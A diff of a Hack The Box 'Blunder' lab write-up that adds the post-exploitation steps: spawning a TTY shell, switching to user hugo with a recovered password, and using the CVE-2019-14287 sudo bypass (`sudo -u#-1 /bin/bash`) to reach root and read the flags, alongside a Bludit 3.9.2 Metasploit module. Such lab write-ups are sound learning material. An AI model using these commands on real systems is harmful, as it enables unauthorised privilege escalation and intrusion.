@@ -2,8 +2,8 @@
 title: HTB - Blunder Write-up
 author: bigb0ss
 date: 2020-10-24 23:25:00 +0800
-categories: [Hack The Box, Box, Easy]
-tags: [hackthebox, ]
+categories: [Hack The Box, Linux, Easy]
+tags: [hackthebox, blunder, Bludit CMS 3.9.2, Bruteforce Bypass, Sudo Bypass]
 ---
 
 ![image](/assets/img/post/htb/blunder/01_infocard.png)
@@ -256,7 +256,7 @@ And using an online SHA-1 decryptor, the cleartext password for the `hugo` user 
 
 > **NOTE**: The reverse shell `php/reverse-php` created with the POC script was not allowing for me to spawn a TTY shell such as `python -c 'import pty;pty.spawn("/bin/bash")'`. There was a Metasploit module for this exploit, so moving forward I will be using that instead of the POC script.
 
-Metasploit Setup
+Metasploit Setup:
 ```console
 msf5 exploit(linux/http/bludit_upload_images_exec) > options
 
@@ -288,3 +288,71 @@ Exploit target:
    --  ----
    0   Bludit v3.9.2
 ```
+
+Getting a TTY Shell:
+
+![image](/assets/img/post/htb/blunder/10_tty.png)
+
+And successfully reading the `user.txt` file.
+
+```console
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ su -l hugo
+su -l hugo
+Password: Password120
+
+hugo@blunder:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+hugo@blunder:~$ cat user.txt
+cat user.txt
+18941d126772300c8ea22297f4cd66e6
+```
+
+### hugo --> root (CVE-2019-14287)
+
+By quickly checking what `sudo` privilege the `hugo` user had, it appeared that the `hugo` user could run the `/bin/bash` command as any users but `root`. 
+
+```console
+hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+```
+
+It turned out to be there is a public vulnerability ([CVE-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287)) which can be used to take adventage of this particular `sudoer` configuration. 
+
+In Linux, users can be also called by numbers, such as `root` = `#0`. However, in this case, `sudo -u#0 /bin/bash` was still restricted, but using `sudo -u#-1 /bin/bash`, the restriction was successfully bypassed to gain `root` access. 
+
+```console
+sudo -u#0 /bin/bash
+Password: Password120
+
+Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
+
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+Password: Password120
+
+root@blunder:/home/hugo# id    
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+r
+oot@blunder:/home/hugo# cat /root/root.txt
+cat /root/root.txt
+f278317a8593bd7363e8de5b8b29d6a0
+```
+
+## Conclusion
+This box was pretty simple and easy one to fully compromise. Good learning path to:
+* BLUDIT CMS 3.9.2 Brute-force Mitigation Bypass
+* BLUDIT CMS 3.9.2 Directory Traversal Exaploit
+* CVE-2019-14287 - Sudo Restriction Bypass 
+
+Thanks for reading! :)
